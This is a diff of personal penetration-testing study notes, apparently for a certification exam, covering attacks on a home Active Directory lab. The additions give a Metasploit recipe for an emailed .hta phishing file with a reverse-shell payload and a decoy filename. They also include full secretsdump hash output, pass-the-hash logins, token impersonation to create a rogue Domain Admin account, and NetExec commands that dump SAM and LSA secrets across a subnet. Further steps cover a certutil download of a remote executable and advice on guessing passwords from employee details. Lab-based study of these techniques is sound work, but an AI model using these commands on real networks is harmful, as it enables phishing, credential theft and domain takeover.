@@ -5,6 +5,9 @@ Heath said, in the Practical Ethical Hacking course, during the Utilizing Social
 "Enumerate, enumerate, enumerate." If you get to a point where you're running down a rabbit hole and you can't seem to find anything immediately vulnerable, or obviously exploitable, or you've been trying to get an exploit to work for more than 30 minutes, it's probably time to move on.
 
 Don't waste your time banging your head against a wall. If you're stuck, you should probably go enumerate some more, whether you're outside *or* inside the environment.
+
+PNPT passers consistently say the exam's external login (often a web portal or VPN) is designed to reward OSINT-derived guesses over brute-force marathons—think passwords like "Winter2022!" that scream "company holiday policy" or "JohnDoe@TargetCo2024" from a leaked employee bio.
+> Check out this [video](https://www.youtube.com/watch?v=e2sX44PAQCw)
 ## External Recon
 ### OSINT
 my first priority, for now, when doing recon, is to figure out the naming convention of accounts so that i can try logging in later, either with breached credentials, or by guessing. 
@@ -32,6 +35,8 @@ I think starting w/ Sublist3r and Assetfinder and piping their output through Ht
 I'm gonna list the tools in the order I liked using them against tesla[.]com.
 
 But first, here's a one-liner that runs `httprobe` on the output of `sublist3r` and `assetfinder`: `sublist3r -d target.com > s.txt && assetfinder target.com > a.txt && cat s.txt a.txt | sort -u | httprobe`
+> You can use `sed` and `tr` to edit the output of assetfinder if necessary.
+>> Example to remove `https://` and `:443`: `sed 's/https\?:\/\///' | tr -d ':443'`
 ##### [Sublist3r](https://github.com/aboul3la/Sublist3r)
 Basic passive subdomain enumeration tool that uses **search engines and public APIs** to find subdomains. has barebones active scanning
 >queries search engines and historical databases that may contain **archived/old subdomains** no longer in use
@@ -41,13 +46,23 @@ Basic passive(fast) subdomain enumeration tool that queries public data sources 
 ##### [Amass](https://github.com/owasp-amass/amass)
 OWASP's comprehensive subdomain enumeration tool that performs both passive and active reconnaissance using 70+ data sources.
 
-Here are some of my favorite commands to use w/ Amass:
+Here are some of my favorite commands to use w/ Amass (v4.2.0):
 - Discover target namespaces(root domains) for enumeration: `amass intel`
 - Basic subdomain enumeration: `amass enum -d meow.com -whois -o amass.txt`
 - Basic brute force subdomain enumeration: `amass enum -brute -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -d lookup.thm -o amass.txt`
 - Good brute force subdomain enumeration: `amass enum -active -d owasp.org -brute -w /usr/share/wordlists/amass/deepmagic.com-top50kprefixes.txt -ip -o amass_results_owasp.txt`
 
-[Amass Official User Guide](https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md)
+[Amass v4.2.0 Official User Guide](https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md)
+##### Assetfinder
+Much faster subdomain enumeration than Sublist3r.
+- `assetfinder cyberspace.local`
+	- Grep related subdomains: `assetfinder cyberspace.local | grep cyberspace.local`
+- Related subdomains *only*: `assetfinder --subs-only cyberspace.local`
+#### High Value Subdomains
+- dev
+- test
+- stag
+- admin
 ##### Honorable Mention: [crt.sh](https://crt.sh/)
 "Enter an **Identity** (Domain Name, Organization Name, etc),  
 a **Certificate Fingerprint** (SHA-1 or SHA-256) or a **crt.sh ID**"
@@ -60,6 +75,15 @@ A browser extension that enumerates technologies like Content Management Systems
 CLI tool built-in to Kali Linux that enumerates web technologies and website headers.
 
 ---
+## External Initial Foothold
+#### Malicious Document
+Use metasploit to generate a malicious `.hta` file that can be sent via email
+- Metasploit module: `windows/misc/hta_server`
+- Payload: `windows/x64/meterpreter/reverse_tcp`
+- Exploit target: `Powershell x64`
+- Example URI: `Health Dental Policy 2026.hta`
+> See this [video](https://www.youtube.com/watch?v=BU04m-h174g)
+>> Found via [PNPT-study-guide on GitHub](https://github.com/peterrakolcza/PNPT-study-guide/tree/main/Exam%20tips)
 ## Internal Recon
 ### Active Recon
 1. ran nmap scan
@@ -268,9 +292,87 @@ Spider Murphy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b
 ### Shells w/ psexec
 8. ran `msfconsole` and used psexec to log in to acunningham using cracked password(Password12345) and then also logged in as local administrator account using dumped SAM hash
 9. then ran `psexec.py` to login as local administrator using dumped SAM hash.
-> note that if `psexec.py` is blocked, you should try `wmiexec.py` and `smbexec.py`
+> note that if `psexec.py` is blocked, you should try `wmiexec.py` and `smbexec.py`. NetExec has this failover functionality built-in, so really, just use `nxc`.
 >> `wmiexec.py administrator@10.10.10.5 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`
+### Dumping Secrets w/ SecretsDump
+Captured SAM hashes on acunningham workstation
+```
+secretsdump.py CYBERSPACE.local/acunningham:Password12345@10.10.10.5                    
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x29cb493105dfdbb0c9abae5009cbd69f
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3f345522654e41a657fdbdd9324b283b:::
+Alt Cunningham:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+CYBERSPACE.LOCAL/acunningham:$DCC2$10240#acunningham#2c4b850fa4d5bd3b561b0f59593ef676
+CYBERSPACE.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+CYBERSPACE\ACUNNINGHAM$:aes256-cts-hmac-sha1-96:e77aa766680bf41a8767c3c074a8fb9f53489fa776254303e318c78f8bd4f320
+CYBERSPACE\ACUNNINGHAM$:aes128-cts-hmac-sha1-96:ebab36f87705b8bf826cd35bbe175ea4
+CYBERSPACE\ACUNNINGHAM$:des-cbc-md5:f1895bc71c084964
+CYBERSPACE\ACUNNINGHAM$:aad3b435b51404eeaad3b435b51404ee:272afdb0faac24dac2c687d25188d1c5:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x16b41a41817b86a152dfa0bdb9da3189f2af562b
+dpapi_userkey:0xbf2f85d9609e81469b14ebddcc93340bebe794bb
+[*] NL$KM 
+ 0000   85 12 F0 EB 2F B2 52 35  78 A4 02 5D 09 67 80 CC   ..../.R5x..].g..
+ 0010   C4 8F E6 1C A7 09 7F 0B  69 C3 95 BF 92 97 E0 58   ........i......X
+ 0020   EE C3 CB DA 44 EB D4 76  D3 9B 09 59 DF 46 B8 28   ....D..v...Y.F.(
+ 0030   A2 F1 8C 82 8E A8 D5 25  BB 09 63 CD 62 F5 35 9E   .......%..c.b.5.
+NL$KM:8512f0eb2fb2523578a4025d096780ccc48fe61ca7097f0b69c395bf9297e058eec3cbda44ebd476d39b0959df46b828a2f18c828ea8d525bb0963cd62f5359e
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[*] Restoring the disabled state for service RemoteRegistry
+```
+
+Captured SAM hashes on smurphy workstation
+```
+secretsdump.py CYBERSPACE.local/acunningham:Password12345@10.10.10.6
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xa1a79c5c4b998767df411d1e107f4744
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6e9a00438f1da0e358bb8f2542888a98:::
+Spider Murphy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+CYBERSPACE.LOCAL/smurphy:$DCC2$10240#smurphy#5b032f3d76bd925ef9e6281349524070
+CYBERSPACE.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
+CYBERSPACE.LOCAL/daethyra:$DCC2$10240#daethyra#2de4c1ca3d572d7fbf99a76bd9ce68c8
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+CYBERSPACE\SMURPHY$:aes256-cts-hmac-sha1-96:74aa67d2364d36bb9273e2c36d05fcebb92181da8fa2200965faf9397d3d5817
+CYBERSPACE\SMURPHY$:aes128-cts-hmac-sha1-96:986ab40d93f1169c8cf5b595e7b01852
+CYBERSPACE\SMURPHY$:des-cbc-md5:aeec8c6b2f647610
+CYBERSPACE\SMURPHY$:aad3b435b51404eeaad3b435b51404ee:5c37a6ad6eaef038c7828a3539648c6e:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xc04ba9a6a512107c02d8eb1f63543204c383ff2a
+dpapi_userkey:0xdc79ca60788458939d7bdf090a646398f7995733
+[*] NL$KM 
+ 0000   7D DF 12 88 B4 97 54 82  9F 6B 92 49 40 C6 A1 E1   }.....T..k.I@...
+ 0010   99 75 FC 14 CD 14 9B F3  2D CD FD 75 67 A4 F0 F6   .u......-..ug...
+ 0020   60 48 73 F8 45 7D 70 64  F4 0B D3 B9 17 53 D3 20   `Hs.E}pd.....S. 
+ 0030   94 8C 8F 08 30 0C 3F E4  B5 3F 46 04 AD E4 14 2E   ....0.?..?F.....
+NL$KM:7ddf1288b49754829f6b924940c6a1e19975fc14cd149bf32dcdfd7567a4f0f6604873f8457d7064f40bd3b91753d320948c8f08300c3fe4b53f4604ade4142e
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[*] Restoring the disabled state for service RemoteRegistry
+```
+#### SecretsDump w/ hashes
+Example: `secretsdump.py CYBERSPACE.local/acunningham@10.10.10.6 -hashes aaxxxxkljfdjsl:aldfaioukjfd`
 ### IPv6 takeover w/ mitm6
 8. since i know the Domain Controller is at 10.10.10.4, I can use `mitm6` to take over ipv6
 > ran `ntlmrelayx.py -6 -t ldaps://10.10.10.4 -wh wpad.cyberspace.local -l mitm6loot`
@@ -345,12 +447,76 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 ```
 ## Post Compromise
 
-### Token Impersonation
+### Token Impersonation and Creating New Domain Administrator User
 #### Using Msfconsole (psexec, incognito module)
-1. got shell via `windows/smb/psexec`
-2. used `load incognito`
-3. ensured users on workstation were logged in, then used `list_tokens -u` to see tokens available for delegation
-4. used `impersonate_token CYBERSPACE\\acunningham` to impersonate acunningham
-5. used `impersonate_token CYBERSPACE\\administrator` to impersonate active directory administrator account
-6. created new user account via `net user /add miaomiao Password21@ /domain` for persistence
-7. added miaomiao to domain administrators group via `net group "Domain Admins" miaomiao /ADD /DOMAIN`
+1. Used `windows/smb/psexec` w/ acunningham domain account
+2. Loaded incognito module: `load incognito`
+3. Listed available delegate tokens: `list_tokens -u`
+4. Listed domain groups: `list_tokens -g`
+5. Impersonated domain administrator(requires domain admin be logged in): `impersonate_token cyberspace\\administrator`
+6. Created new user: `net user /add daethyra Password12345 /domain`
+7. Added Daethyra to Domain Administrators Group: `net group "Domain Admins" daethyra /ADD /DOMAIN`
+### Further Enumeration
+#### Bloodhound
+1. Started Neo4j: `sudo neo4j console`
+2. Started Bloodhound: `sudo bloodhound`
+3. Used remote digester to gram domain information:
+```
+sudo bloodhound-python -d cyberspace.local -u daethyra -p Password12345 -ns 10.10.10.4 -c all
+[sudo] password for kali: 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: cyberspace.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (cyberspace-dc.cyberspace.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: cyberspace-dc.cyberspace.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: cyberspace-dc.cyberspace.local
+INFO: Found 9 users
+INFO: Found 52 groups
+INFO: Found 3 gpos
+INFO: Found 2 ous
+INFO: Found 22 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SMurphy.CYBERSPACE.local
+INFO: Querying computer: ACunningham.CYBERSPACE.local
+INFO: Querying computer: Cyberspace-DC.CYBERSPACE.local
+INFO: Done in 00M 02S
+```
+4. Uploaded data to Bloodhound via Administration tab
+5. Began reviewing data via browser-based cypher-shell
+6. Viewed entire domain structure: `MATCH (n) WHERE n.name CONTAINS "CYBERSPACE.LOCAL" RETURN n`
+7. Reviewed all relationships from acunningham: `MATCH p=(u:User {name: "ACUNNINGHAM@CYBERSPACE.LOCAL"})-[r]->() RETURN p`
+8. Reviewed all login-sessions: `MATCH p=(u:User)-[:HasSession]->(c:Computer) RETURN p LIMIT 10`
+9. Searched known admins:
+```
+MATCH p=(u:User)-[r]->(n) 
+WHERE u.name IN ["ACUNNINGHAM@CYBERSPACE.LOCAL", "SMURPHY@CYBERSPACE.LOCAL", "ADMINISTRATOR@CYBERSPACE.LOCAL", "DAETHYRA@CYBERSPACE.LOCAL"]
+RETURN p
+```
+10. Looked for all possible paths to domain administrator:
+```
+MATCH p=(u:User)-[*1..]->(g:Group {name: "DOMAIN ADMINS@CYBERSPACE.LOCAL"})
+WHERE u.enabled = true
+RETURN u.name AS StartUser, LENGTH(p) AS PathLength
+ORDER BY PathLength ASC
+LIMIT 20
+```
+10. Found shortest path to domain admin: 
+```
+MATCH p=shortestPath((:User {name: "ACUNNINGHAM@CYBERSPACE.LOCAL"})-[*1..]->(:Group {name: "DOMAIN ADMINS@CYBERSPACE.LOCAL"}))
+RETURN p
+```
+#### NetExec
+1. Enumerated writable shares: `nxc smb 10.10.10.5 -u daethyra -p Password12345 --shares WRITE`
+2. Dumped security questions: `nxc smb 10.10.10.5 -u daethyra -p Password12345 -M security-questions`
+3. Failed to put file: `nxc smb 10.10.10.5 -u daethyra -p Password12345 --put-file winPEASany.exe \\Windows\Temp\\winpeasany.exe`
+4. Dumped SAM: `nxc smb 10.10.10.5 -u daethyra -p Password12345 --sam`
+5. Dumped SAM *and* LSA for entire domain: `nxc smb 10.10.10.0/24 -u daethyra -p Password12345 --lsa --sam`
+#### File Transfer
+1. Certutil: `certutil.exe -urlcache -f http://10.10.10.7/meowmeow.exe`
+2. Python: `python3 -m http.server`
+3. FTP: `python3 -m pyftpdlib 21`
+4. Basic `WGET`
